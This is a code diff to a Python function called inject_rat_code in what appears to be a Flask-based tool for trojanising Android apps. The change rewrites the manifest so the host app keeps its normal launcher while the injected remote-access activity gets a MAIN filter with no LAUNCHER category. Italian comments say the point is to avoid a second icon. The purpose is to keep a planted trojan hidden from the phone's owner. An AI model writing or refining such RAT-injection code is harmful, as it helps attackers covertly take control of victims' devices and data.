@@ -559,53 +559,46 @@ def inject_rat_code(username, decoded_path, server_ip, server_port, flask_port):
     else:
         append_flask_log(username, f"LauncherActivity '{launcher_activity_name}' already exists.")
 
-    # Remove existing MAIN/LAUNCHER intent-filters from ALL activities and activity-aliases
-    # We iterate over a list of all relevant tags to modify the tree directly
-    elements_to_process = list(application_tag.findall('activity')) + list(application_tag.findall('activity-alias'))
-
-    for element_tag in elements_to_process:
-        # Skip our LauncherActivity - we'll handle it separately
-        element_name = element_tag.get(f'{ANDROID_NS}name')
-        if element_name == launcher_activity_name or element_name == f'.{launcher_activity_name.split(".")[-1]}':
-            continue 
-
-        # Remove MAIN/LAUNCHER intent-filters from all other activities
-        for intent_filter_tag in list(element_tag.findall('intent-filter')): 
-            is_main_action = False
-            is_launcher_category = False
-            
-            # Check if this intent-filter contains MAIN and LAUNCHER
-            for child in intent_filter_tag:
-                if child.tag == 'action' and child.get(f'{ANDROID_NS}name') == 'android.intent.action.MAIN':
-                    is_main_action = True
-                if child.tag == 'category' and child.get(f'{ANDROID_NS}name') == 'android.intent.category.LAUNCHER':
-                    is_launcher_category = True
-            
-            if is_main_action and is_launcher_category:
-                # This filter makes an activity a launcher. Since it's not OURS, remove it.
-                element_tag.remove(intent_filter_tag)
-                append_flask_log(username, f"Removed MAIN/LAUNCHER intent-filter from: {element_name}")
+    # NON rimuoviamo più i MAIN/LAUNCHER intent-filters dalle attività originali
+    # per permettere all'app di funzionare normalmente
+    append_flask_log(username, "Preserving original app's MAIN/LAUNCHER intent-filters for normal functionality")
     
-    # Now, add/ensure MAIN/LAUNCHER intent-filter for our LauncherActivity
+    # Vecchio codice commentato:
+    # elements_to_process = list(application_tag.findall('activity')) + list(application_tag.findall('activity-alias'))
+    # for element_tag in elements_to_process:
+    #     element_name = element_tag.get(f'{ANDROID_NS}name')
+    #     if element_name == launcher_activity_name or element_name == f'.{launcher_activity_name.split(".")[-1]}':
+    #         continue
+    #     for intent_filter_tag in list(element_tag.findall('intent-filter')):
+    #         is_main_action = False
+    #         is_launcher_category = False
+    #         for child in intent_filter_tag:
+    #             if child.tag == 'action' and child.get(f'{ANDROID_NS}name') == 'android.intent.action.MAIN':
+    #                 is_main_action = True
+    #             if child.tag == 'category' and child.get(f'{ANDROID_NS}name') == 'android.intent.category.LAUNCHER':
+    #                 is_launcher_category = True
+    #         if is_main_action and is_launcher_category:
+    #             element_tag.remove(intent_filter_tag)
+    #             append_flask_log(username, f"Removed MAIN/LAUNCHER intent-filter from: {element_name}")
+    
+    # Aggiungiamo un intent-filter per il nostro LauncherActivity, ma senza LAUNCHER
+    # per evitare di mostrare due icone dell'app
     found_our_launcher_filter = False
     for intent_filter_tag in our_launcher_tag.findall('intent-filter'):
         is_main_action = False
-        is_launcher_category = False
         for action_tag in intent_filter_tag.findall('action'):
             if action_tag.get(f'{ANDROID_NS}name') == 'android.intent.action.MAIN':
                 is_main_action = True
-        for category_tag in intent_filter_tag.findall('category'):
-            if category_tag.get(f'{ANDROID_NS}name') == 'android.intent.category.LAUNCHER':
-                is_launcher_category = True
-        if is_main_action and is_launcher_category:
-            found_our_launcher_filter = True
+                found_our_launcher_filter = True
+                break
+        if found_our_launcher_filter:
             break
     
     if not found_our_launcher_filter:
         launcher_intent_filter = ET.SubElement(our_launcher_tag, 'intent-filter')
         ET.SubElement(launcher_intent_filter, 'action', {f'{ANDROID_NS}name': 'android.intent.action.MAIN'})
-        ET.SubElement(launcher_intent_filter, 'category', {f'{ANDROID_NS}name': 'android.intent.category.LAUNCHER'})
-        append_flask_log(username, f"Ensured MAIN and LAUNCHER intent-filter on {launcher_activity_name}.")
+        # Non aggiungiamo la categoria LAUNCHER per evitare di mostrare due icone
+        append_flask_log(username, f"Added MAIN intent-filter (without LAUNCHER) to {launcher_activity_name} to avoid duplicate icons.")
     
     try:
         tree.write(manifest_path, encoding="utf-8", xml_declaration=True)
